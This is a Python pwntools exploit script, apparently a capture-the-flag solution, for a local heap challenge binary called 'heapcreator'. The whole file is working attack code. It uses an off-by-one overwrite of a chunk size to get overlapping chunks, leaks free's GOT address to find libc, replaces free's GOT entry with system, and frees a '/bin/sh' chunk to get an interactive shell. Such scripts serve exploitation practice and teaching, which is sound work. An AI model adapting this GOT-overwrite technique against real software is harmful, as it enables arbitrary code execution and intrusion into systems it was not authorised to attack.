#!/usr/bin/env python
from pwn import *

elf = ELF("./heapcreator")
libc = ELF("./libc.so.6")
context.log_level = "debug"
sh = process("./heapcreator")

free_got = elf.got['free']
log.success("free_got -> " + hex(free_got))
free_libc_addr = libc.symbols['free']
log.success("free_libc_addr -> " + hex(free_libc_addr))
system_libc_addr = libc.symbols['system']
log.success("system_libc_addr -> " + hex(system_libc_addr))

def create(size, content):
    sh.sendline('1')
    sh.sendline(str(size))
    sh.sendline(str(content))
    sh.recvuntil("SuccessFul")
    log.success("Creat success!")

def edit(index, content):
    sh.sendline('2')
    sh.sendline(str(index))
    sh.sendline(str(content))
    sh.recvuntil("Done !")
    log.success("Edit success!")

def show(index):
    sh.sendline('3')
    sh.sendline(str(index))

def delete(index):
    sh.sendline('4')
    sh.sendline(str(index))
    sh.recvuntil("Done !")
    log.success("Delete success!")

if __name__ == "__main__":
    create(0x18,'aaaa')
    create(0x10, 'bbbb')

    content = '/bin/sh\x00' + 'a'*0x10 + "\x41"
    edit(0, content)
    delete(1)

    content = 'deadbeef'*4 + p64(30) + p64(free_got)
    create(0x30,content)
    show(1)
    sh.recvuntil("Content : ")
    free_addr = u64(sh.recv(6).ljust(8, '\x00'))
    log.success("free_addr -> " + hex(free_addr))

    offset = free_addr - free_libc_addr
    system_addr = offset + system_libc_addr

    edit(1,p64(system_addr))
    delete(0)

    sh.interactive()
